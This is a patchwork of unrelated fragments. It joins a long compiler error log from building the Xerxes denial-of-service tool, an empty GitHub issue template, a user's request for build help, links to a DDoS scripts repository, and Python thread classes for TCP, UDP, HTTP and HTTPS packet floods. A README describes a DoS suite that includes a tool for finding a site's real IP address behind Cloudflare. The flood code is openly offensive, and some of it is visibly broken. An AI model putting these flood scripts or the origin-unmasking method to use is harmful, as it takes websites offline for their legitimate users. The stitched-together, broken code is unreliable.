[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:905:1:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_CONSTEXPR11[m[K’
 FMT_CONSTEXPR11 init<C, basic_string_view<typename C::char_type>, string_type>
[01;32m[K ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:916:22:[m[K [01;35m[Kwarning: [m[Kscoped enums only available with -std=c++11 or -std=gnu++11 [enabled by default]
 enum : unsigned long long { is_unpacked_bit = 1ull << 63 };
[01;32m[K                      ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:934:27:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K,[m[K’ or ‘[01m[K...[m[K’ before ‘[01m[K&&[m[K’ token
   visit_format_arg(Visitor&& vis, const basic_format_arg<Ctx>& arg);
[01;32m[K                           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:134:39:[m[K [01;35m[Kwarning: [m[Kexplicit conversion operators only available with -std=c++11 or -std=gnu++11 [enabled by default]
 #  define FMT_DETECTED_NOEXCEPT throw()
[01;32m[K                                       ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:140:26:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_DETECTED_NOEXCEPT[m[K’
 #    define FMT_NOEXCEPT FMT_DETECTED_NOEXCEPT
[01;32m[K                          ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:956:52:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_NOEXCEPT[m[K’
   FMT_CONSTEXPR FMT_EXPLICIT operator bool() const FMT_NOEXCEPT {
[01;32m[K                                                    ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:977:12:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K,[m[K’ or ‘[01m[K...[m[K’ before ‘[01m[K&&[m[K’ token
     Visitor&& vis, const basic_format_arg<Context>& arg) {
[01;32m[K            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K In function ‘[01m[Ktypename fmt::v5::internal::result_of<Visitor(int)>::type fmt::v5::visit_format_arg(Visitor)[m[K’:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:979:11:[m[K [01;31m[Kerror: [m[K‘[01m[Karg[m[K’ was not declared in this scope
   switch (arg.type_) {
[01;32m[K           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:986:36:[m[K [01;31m[Kerror: [m[Kthere are no arguments to ‘[01m[Kvis[m[K’ that depend on a template parameter, so a declaration of ‘[01m[Kvis[m[K’ must be available [-fpermissive]
     return vis(arg.value_.int_value);
[01;32m[K                                    ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:988:37:[m[K [01;31m[Kerror: [m[Kthere are no arguments to ‘[01m[Kvis[m[K’ that depend on a template parameter, so a declaration of ‘[01m[Kvis[m[K’ must be available [-fpermissive]
     return vis(arg.value_.uint_value);
[01;32m[K                                     ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:990:42:[m[K [01;31m[Kerror: [m[Kthere are no arguments to ‘[01m[Kvis[m[K’ that depend on a template parameter, so a declaration of ‘[01m[Kvis[m[K’ must be available [-fpermissive]
     return vis(arg.value_.long_long_value);
[01;32m[K                                          ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:992:43:[m[K [01;31m[Kerror: [m[Kthere are no arguments to ‘[01m[Kvis[m[K’ that depend on a template parameter, so a declaration of ‘[01m[Kvis[m[K’ must be available [-fpermissive]
     return vis(arg.value_.ulong_long_value);
[01;32m[K                                           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:994:41:[m[K [01;31m[Kerror: [m[Kthere are no arguments to ‘[01m[Kvis[m[K’ that depend on a template parameter, so a declaration of ‘[01m[Kvis[m[K’ must be available [-fpermissive]
     return vis(arg.value_.int_value != 0);
[01;32m[K                                         ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:996:60:[m[K [01;31m[Kerror: [m[Kthere are no arguments to ‘[01m[Kvis[m[K’ that depend on a template parameter, so a declaration of ‘[01m[Kvis[m[K’ must be available [-fpermissive]
     return vis(static_cast<char_type>(arg.value_.int_value));
[01;32m[K                                                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:998:39:[m[K [01;31m[Kerror: [m[Kthere are no arguments to ‘[01m[Kvis[m[K’ that depend on a template parameter, so a declaration of ‘[01m[Kvis[m[K’ must be available [-fpermissive]
     return vis(arg.value_.double_value);
[01;32m[K                                       ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1000:44:[m[K [01;31m[Kerror: [m[Kthere are no arguments to ‘[01m[Kvis[m[K’ that depend on a template parameter, so a declaration of ‘[01m[Kvis[m[K’ must be available [-fpermissive]
     return vis(arg.value_.long_double_value);
[01;32m[K                                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1002:39:[m[K [01;31m[Kerror: [m[Kthere are no arguments to ‘[01m[Kvis[m[K’ that depend on a template parameter, so a declaration of ‘[01m[Kvis[m[K’ must be available [-fpermissive]
     return vis(arg.value_.string.value);
[01;32m[K                                       ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1007:34:[m[K [01;31m[Kerror: [m[Kthere are no arguments to ‘[01m[Kvis[m[K’ that depend on a template parameter, so a declaration of ‘[01m[Kvis[m[K’ must be available [-fpermissive]
     return vis(arg.value_.pointer);
[01;32m[K                                  ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1011:25:[m[K [01;31m[Kerror: [m[Kthere are no arguments to ‘[01m[Kvis[m[K’ that depend on a template parameter, so a declaration of ‘[01m[Kvis[m[K’ must be available [-fpermissive]
   return vis(monostate());
[01;32m[K                         ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K At global scope:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1016:14:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K,[m[K’ or ‘[01m[K...[m[K’ before ‘[01m[K&&[m[K’ token
 visit(Visitor&& vis, const basic_format_arg<Context>& arg) {
[01;32m[K              ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K In function ‘[01m[Ktypename fmt::v5::internal::result_of<Visitor(int)>::type fmt::v5::visit(Visitor)[m[K’:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1017:27:[m[K [01;31m[Kerror: [m[K‘[01m[Kforward[m[K’ is not a member of ‘[01m[Kstd[m[K’
   return visit_format_arg(std::forward<Visitor>(vis), arg);
[01;32m[K                           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1017:47:[m[K [01;31m[Kerror: [m[Kexpected primary-expression before ‘[01m[K>[m[K’ token
   return visit_format_arg(std::forward<Visitor>(vis), arg);
[01;32m[K                                               ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1017:49:[m[K [01;31m[Kerror: [m[K‘[01m[Kvis[m[K’ was not declared in this scope
   return visit_format_arg(std::forward<Visitor>(vis), arg);
[01;32m[K                                                 ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1017:55:[m[K [01;31m[Kerror: [m[K‘[01m[Karg[m[K’ was not declared in this scope
   return visit_format_arg(std::forward<Visitor>(vis), arg);
[01;32m[K                                                       ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K At global scope:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1024:29:[m[K [01;35m[Kwarning: [m[Kdefaulted and deleted functions only available with -std=c++11 or -std=gnu++11 [enabled by default]
   arg_map(const arg_map&) = delete;
[01;32m[K                             ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1025:36:[m[K [01;35m[Kwarning: [m[Kdefaulted and deleted functions only available with -std=c++11 or -std=gnu++11 [enabled by default]
   void operator=(const arg_map&) = delete;
[01;32m[K                                    ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K In member function ‘[01m[Kvoid fmt::v5::internal::arg_map<Context>::push_back(fmt::v5::internal::value<Context>)[m[K’:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1039:19:[m[K [01;35m[Kwarning: [m[Kextended initializer lists only available with -std=c++11 or -std=gnu++11 [enabled by default]
     map_[size_] = entry{named.name, named.template deserialize<Context>()};
[01;32m[K                   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K In member function ‘[01m[Kfmt::v5::basic_format_arg<Context> fmt::v5::internal::arg_map<Context>::find(fmt::v5::basic_string_view<typename S::char_type>) const[m[K’:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1053:5:[m[K [01;35m[Kwarning: [m[Kextended initializer lists only available with -std=c++11 or -std=gnu++11 [enabled by default]
     return {};
[01;32m[K     ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K At global scope:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1072:7:[m[K [01;31m[Kerror: [m[Kexpected identifier
       make_value<Context>(declval<typename std::decay<T>::type&>())) value_type;
[01;32m[K       ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1072:26:[m[K [01;31m[Kerror: [m[Kexpected unqualified-id before ‘[01m[K([m[K’ token
       make_value<Context>(declval<typename std::decay<T>::type&>())) value_type;
[01;32m[K                          ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1072:26:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K)[m[K’ before ‘[01m[K([m[K’ token
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1072:27:[m[K [01;31m[Kerror: [m[K‘[01m[Kdeclval[m[K’ has not been declared
       make_value<Context>(declval<typename std::decay<T>::type&>())) value_type;
[01;32m[K                           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1072:34:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K,[m[K’ or ‘[01m[K...[m[K’ before ‘[01m[K<[m[K’ token
       make_value<Context>(declval<typename std::decay<T>::type&>())) value_type;
[01;32m[K                                  ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1072:67:[m[K [01;31m[Kerror: [m[KISO C++ forbids declaration of ‘[01m[Kdecltype[m[K’ with no type [-fpermissive]
       make_value<Context>(declval<typename std::decay<T>::type&>())) value_type;
[01;32m[K                                                                   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1072:67:[m[K [01;31m[Kerror: [m[K‘[01m[Kdecltype[m[K’ declared as function returning a function
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1072:67:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K;[m[K’ at end of member declaration
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1072:68:[m[K [01;31m[Kerror: [m[Kexpected unqualified-id before ‘[01m[K)[m[K’ token
       make_value<Context>(declval<typename std::decay<T>::type&>())) value_type;
[01;32m[K                                                                    ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1073:29:[m[K [01;31m[Kerror: [m[K‘[01m[Kvalue_type[m[K’ has not been declared
   static const type value = value_type::type_tag;
[01;32m[K                             ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:78:27:[m[K [01;31m[Kerror: [m[K‘[01m[Kconstexpr[m[K’ does not name a type
 #  define FMT_CONSTEXPR11 constexpr
[01;32m[K                           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1076:29:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_CONSTEXPR11[m[K’
 template <typename Context> FMT_CONSTEXPR11 unsigned long long get_types() {
[01;32m[K                             ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:78:27:[m[K [01;36m[Knote: [m[KC++11 ‘[01m[Kconstexpr[m[K’ only available with -std=c++11 or -std=gnu++11
 #  define FMT_CONSTEXPR11 constexpr
[01;32m[K                           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1076:29:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_CONSTEXPR11[m[K’
 template <typename Context> FMT_CONSTEXPR11 unsigned long long get_types() {
[01;32m[K                             ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1080:51:[m[K [01;35m[Kwarning: [m[Kvariadic templates only available with -std=c++11 or -std=gnu++11 [enabled by default]
 template <typename Context, typename Arg, typename... Args>
[01;32m[K                                                   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:78:27:[m[K [01;31m[Kerror: [m[K‘[01m[Kconstexpr[m[K’ does not name a type
 #  define FMT_CONSTEXPR11 constexpr
[01;32m[K                           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1081:1:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_CONSTEXPR11[m[K’
 FMT_CONSTEXPR11 unsigned long long get_types() {
[01;32m[K ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:78:27:[m[K [01;36m[Knote: [m[KC++11 ‘[01m[Kconstexpr[m[K’ only available with -std=c++11 or -std=gnu++11
 #  define FMT_CONSTEXPR11 constexpr
[01;32m[K                           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1081:1:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_CONSTEXPR11[m[K’
 FMT_CONSTEXPR11 unsigned long long get_types() {
[01;32m[K ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:44:[m[K [01;31m[Kerror: [m[K‘[01m[Kenable_if[m[K’ in namespace ‘[01m[Kstd[m[K’ does not name a type
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1094:11:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
           FMT_ENABLE_IF(IS_PACKED)>
[01;32m[K           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:53:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K>[m[K’ before ‘[01m[K<[m[K’ token
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                                     ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1094:11:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
           FMT_ENABLE_IF(IS_PACKED)>
[01;32m[K           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:44:[m[K [01;31m[Kerror: [m[K‘[01m[Kenable_if[m[K’ in namespace ‘[01m[Kstd[m[K’ does not name a type
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1100:11:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
           FMT_ENABLE_IF(!IS_PACKED)>
[01;32m[K           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:53:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K>[m[K’ before ‘[01m[K<[m[K’ token
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                                     ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1100:11:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
           FMT_ENABLE_IF(!IS_PACKED)>
[01;32m[K           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1118:55:[m[K [01;35m[Kwarning: [m[Kdefaulted and deleted functions only available with -std=c++11 or -std=gnu++11 [enabled by default]
   basic_format_context(const basic_format_context&) = delete;
[01;32m[K                                                       ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1119:49:[m[K [01;35m[Kwarning: [m[Kdefaulted and deleted functions only available with -std=c++11 or -std=gnu++11 [enabled by default]
   void operator=(const basic_format_context&) = delete;
[01;32m[K                                                 ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K In member function ‘[01m[Kfmt::v5::internal::error_handler fmt::v5::basic_format_context<OutputIt, Char>::error_handler()[m[K’:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1145:45:[m[K [01;35m[Kwarning: [m[Kextended initializer lists only available with -std=c++11 or -std=gnu++11 [enabled by default]
   internal::error_handler error_handler() { return {}; }
[01;32m[K                                             ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K At global scope:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1160:54:[m[K [01;31m[Kerror: [m[K‘[01m[K>>[m[K’ should be ‘[01m[K> >[m[K’ within a nested template argument list
       std::back_insert_iterator<internal::buffer<Char>>, Char>
[01;32m[K                                                      ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1173:37:[m[K [01;35m[Kwarning: [m[Kvariadic templates only available with -std=c++11 or -std=gnu++11 [enabled by default]
 template <typename Context, typename... Args> class format_arg_store {
[01;32m[K                                     ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1175:40:[m[K [01;35m[Kwarning: [m[Kvariadic templates only available with -std=c++11 or -std=gnu++11 [enabled by default]
   static const size_t NUM_ARGS = sizeof...(Args);
[01;32m[K                                        ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1180:25:[m[K [01;31m[Kerror: [m[K‘[01m[Kconditional[m[K’ in namespace ‘[01m[Kstd[m[K’ does not name a type
   typedef typename std::conditional<IS_PACKED, internal::value<Context>,
[01;32m[K                         ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1180:36:[m[K [01;31m[Kerror: [m[Kexpected unqualified-id before ‘[01m[K<[m[K’ token
   typedef typename std::conditional<IS_PACKED, internal::value<Context>,
[01;32m[K                                    ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1186:3:[m[K [01;31m[Kerror: [m[K‘[01m[Kvalue_type[m[K’ does not name a type
   value_type data_[DATA_SIZE];
[01;32m[K   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:78:27:[m[K [01;31m[Kerror: [m[K‘[01m[Kconstexpr[m[K’ does not name a type
 #  define FMT_CONSTEXPR11 constexpr
[01;32m[K                           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1190:10:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_CONSTEXPR11[m[K’
   static FMT_CONSTEXPR11 unsigned long long get_types() {
[01;32m[K          ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:78:27:[m[K [01;36m[Knote: [m[KC++11 ‘[01m[Kconstexpr[m[K’ only available with -std=c++11 or -std=gnu++11
 #  define FMT_CONSTEXPR11 constexpr
[01;32m[K                           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1190:10:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_CONSTEXPR11[m[K’
   static FMT_CONSTEXPR11 unsigned long long get_types() {
[01;32m[K          ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:78:27:[m[K [01;31m[Kerror: [m[K‘[01m[Kconstexpr[m[K’ does not name a type
 #  define FMT_CONSTEXPR11 constexpr
[01;32m[K                           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1197:10:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_CONSTEXPR11[m[K’
   static FMT_CONSTEXPR11 unsigned long long TYPES = get_types();
[01;32m[K          ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:78:27:[m[K [01;36m[Knote: [m[KC++11 ‘[01m[Kconstexpr[m[K’ only available with -std=c++11 or -std=gnu++11
 #  define FMT_CONSTEXPR11 constexpr
[01;32m[K                           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1197:10:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_CONSTEXPR11[m[K’
   static FMT_CONSTEXPR11 unsigned long long TYPES = get_types();
[01;32m[K          ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1211:35:[m[K [01;35m[Kwarning: [m[Kvariadic templates only available with -std=c++11 or -std=gnu++11 [enabled by default]
   format_arg_store(const Args&... args)
[01;32m[K                                   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K In constructor ‘[01m[Kfmt::v5::format_arg_store<Context, Args>::format_arg_store(const Args& ...)[m[K’:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1212:9:[m[K [01;31m[Kerror: [m[Kclass ‘[01m[Kfmt::v5::format_arg_store<Context, Args>[m[K’ does not have any field named ‘[01m[Kdata_[m[K’
       : data_{internal::make_arg<IS_PACKED, Context>(args)...} {}
[01;32m[K         ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1212:9:[m[K [01;35m[Kwarning: [m[Kextended initializer lists only available with -std=c++11 or -std=gnu++11 [enabled by default]
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K At global scope:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1230:54:[m[K [01;35m[Kwarning: [m[Kvariadic templates only available with -std=c++11 or -std=gnu++11 [enabled by default]
 template <typename Context = format_context, typename... Args>
[01;32m[K                                                      ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1232:20:[m[K [01;35m[Kwarning: [m[Kvariadic templates only available with -std=c++11 or -std=gnu++11 [enabled by default]
     const Args&... args) {
[01;32m[K                    ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1232:24:[m[K [01;31m[Kerror: [m[Kdefault template arguments may not be used in function templates without -std=c++11 or -std=gnu++11
     const Args&... args) {
[01;32m[K                        ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K In function ‘[01m[Kfmt::v5::format_arg_store<Context, Args ...> fmt::v5::make_format_args(const Args& ...)[m[K’:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1233:3:[m[K [01;35m[Kwarning: [m

make: *** [all] Error 2
[root@app build]#  **Is your feature request related to a problem? Please describe.**
A clear and concise description of what the problem is. Ex. I'm always frustrated when [...]

**Describe the solution you'd like**
A clear and concise description of what you want to happen.

**Describe alternatives you've considered**
A clear and concise description of any alternative solutions or features you've considered.

**Additional context**
Add any other context or screenshots about the feature request here.
 https://github.com/PraneethKarnena/DDoS-Scripts Dark Denial of Service Header https://github.com/PraneethKarnena/DDoS-Scripts class tcpFlood(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip      = ip
        self.port    = port
        self.size    = size
        self.packets = packets
        self.tcp     = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                socket.connect(self.ip, self.port)
                socket.setblocking(0)
                socket.sendto(bytes,(self.ip, self.port))
            except:
                pass
 
class udpFlood(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip      = ip
        self.port    = port
        self.size    = size
        self.packets = packets
        self.udp     = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                if self.port == 0:
                    self.port = random.randrange(1, 65535)
                self.udp.sendto(bytes,(self.ip, self.port))
            except:
                pass

class httpFlood(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip      = ip
        self.port    = port
        self.size    = size
        self.packets = packets
        self.http     = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                if self.port == 0:
                    self.port = random.randrange(1, 65535)
                self.http.sendto(bytes,(self.ip, self.port))
            except:
                pass
class httpsFlood(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip      = ip
        self.port    = port
        self.size    = size
        self.packets = packets
        self.https     = threading.socket(socket.AF_INET,socket.SOCK_STREAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                threading(self.ip, self.port)
                threading(0)
                threading(bytes,(self.ip, self.port))
            except:
                pass This Denial Of Service suite comprises of the following features :

CloudBust :- Cloudbust a.k.a AETHON is a cloudflare resolver that looks into the cloudflare protected website for misconfigured DNS configuration basically uses dnsdumpster.com as its resolver :)and identifies the backend IP of the website. We will add more updates in upcoming time.

HTTP Flood :- HTTP Flood is a type of Denial of Service attack in which the attacker manipulates HTTP and POST unwanted requests in order to attack a web server or application. In an HTTP flood, the HTTP clients such as web browser interact with an application
or server to send HTTP requests. The aim of the attack is when to compel the server to allocate as many resources as possible to serving the attack thus denying legitimate users access to the server's resources. ALISA is a http d.o.s tool written in such a way to suck all of the website's resources and is a layer 7 D.O.S tool.

TCP SYN Flood :- A SYN flood is a form of denial-of-service attack in which an attacker sends a succession of SYN requests to a target's system in
an attempt to consume enough server resources to make the system unresponsive to legitimate traffic.

UDP Flood :- A UDP flood attack is a denial-of-service (DoS) attack using the User Datagram Protocol (UDP), a sessionless/connectionless computer networking protocol. hi，i  am git clone --recursive https://github.com/netzeng/Xerxes  this project。
cmake3 ok。
There was a mistake， when i  execute   make command   。
Please give me a hand. Thank you.

[root@app ~]# 
**[root@app ~]# cd Xerxes**
[root@app Xerxes]# dir
bash-completion  build	CMake  CMakeLists.txt  Dockerfile  img	include  lib  LICENSE.md  man  README.md  src  useragents
[root@app Xerxes]# cd build
**[root@app build]# cmake3 ..**
**-- Build type: Release
-- Version: 5.3.1
-- Build type: Release
-- CXX_STANDARD: 17
-- Configuring done
-- Generating done
-- Build files have been written to: /root/Xerxes/build**
**[root@app build]# make**
[  0%] Built target fmt
[ 88%] Built target crypto
[ 96%] Built target ssl
[ 98%] Built target tls
_[ 98%] [34m[1mPrecompiling stdafx.hpp for Xerxes (C++)[0m
In file included from [01m[K/usr/include/c++/4.8.2/cstdint:35:0[m[K,
                 from [01m[K/root/Xerxes/lib/fmt/include/fmt/format.h:34[m[K,
                 from [01m[K/root/Xerxes/lib/fmt/include/fmt/color.h:11[m[K,
                 from [01m[K/root/Xerxes/build/Xerxes_pch/include/stdafx.hpp:5[m[K:_
[01m[K/usr/include/c++/4.8.2/bits/c++0x_warning.h:32:2:[m[K [01;31m[Kerror: [m[K#error This file requires compiler and library support for the ISO C++ 2011 standard. This support is currently experimental, and must be enabled with the -std=c++11 or -std=gnu++11 compiler options.
 #error This file requires compiler and library support for the \
[01;32m[K  ^[m[K
In file included from [01m[K/root/Xerxes/lib/fmt/include/fmt/format.h:60:0[m[K,
                 from [01m[K/root/Xerxes/lib/fmt/include/fmt/color.h:11[m[K,
                 from [01m[K/root/Xerxes/build/Xerxes_pch/include/stdafx.hpp:5[m[K:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:238:15:[m[K [01;31m[Kerror: [m[K‘[01m[Kadd_rvalue_reference[m[K’ in namespace ‘[01m[Kstd[m[K’ does not name a type
 typename std::add_rvalue_reference<T>::type declval() FMT_NOEXCEPT;
[01;32m[K               ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:238:35:[m[K [01;31m[Kerror: [m[Kexpected unqualified-id before ‘[01m[K<[m[K’ token
 typename std::add_rvalue_reference<T>::type declval() FMT_NOEXCEPT;
[01;32m[K                                   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:249:31:[m[K [01;35m[Kwarning: [m[Kvariadic templates only available with -std=c++11 or -std=gnu++11 [enabled by default]
 template <typename F, typename... Args>
[01;32m[K                               ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:250:24:[m[K [01;35m[Kwarning: [m[Kvariadic templates only available with -std=c++11 or -std=gnu++11 [enabled by default]
